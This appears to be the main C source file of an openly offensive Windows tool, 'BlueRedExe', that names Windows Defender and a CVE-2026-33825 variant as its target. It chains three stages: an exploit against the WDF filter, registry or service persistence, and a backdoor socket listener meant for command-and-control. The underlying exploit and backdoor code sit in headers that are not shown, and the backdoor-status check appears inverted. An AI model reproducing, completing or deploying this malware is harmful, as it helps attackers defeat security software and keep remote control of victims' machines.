#include "../include/config.h"
#include "../include/winsock_admin.h"
#include "exploit.h"
#include "persistence.h"
#include "backdoor.h"

// Inside src/main.c

int main(void) {
    // 1. Initialize Winsock
    InitializeWinsock();
    if (wsaInitResult != 0) {
        printf("[DEBUG] WSAStartup failed: %lu\n", (unsigned long)wsaInitResult);
        fflush(stdout);
    }

    printf("=== BlueRedExe v1.0 Started ===\n");
    printf("Target: Windows Defender / WDF Filter (CVE-2026-33825 Variant)\n");
    fflush(stdout);

    // 2. Check Admin Rights
    if (IsAdmin()) {
        printf("[DEBUG] Running as Administrator - Good\n");
        fflush(stdout);
    } else {
        printf("[DEBUG] Running as Standard User - Some registry functions may fail\n");
        fflush(stdout);
    }

    printf("\n--- Stage 1: WDF Race Condition Bypass ---\n");
    fflush(stdout);

    // 3. Run Exploit
    if (!ExecuteExploitLogic()) {
        printf("[EXPLOIT] Stage 1 failed or timed out.\n");
        fflush(stdout);
        Sleep(3000);
        return 1;
    }

    printf("[EXPLOIT] Process spawned. Waiting for race window.\n");
    fflush(stdout);
    Sleep(3000);

    printf("\n--- Stage 2: Persistence Setup ---\n");
    fflush(stdout);

    // 4. Setup Persistence
    if (!RegisterPersistence()) {
        printf("[PERSIST] Fallback: Created a temporary service.\n");
        fflush(stdout);
    }

    printf("\n--- Stage 3: Backdoor Initialization ---\n");
    fflush(stdout);

    // 5. Initialize Backdoor
    if (!StartBackdoor()) {
        printf("[BACKDOOR] Socket listener started.\n");
        fflush(stdout);
    }

    printf("\n--- Exploit Complete ---\n");
    fflush(stdout);
    printf("System Ready for C2 Communication.\n");
    fflush(stdout);
    printf("Press any key to exit...");
    getch();  // Windows console input
    return 0;
}
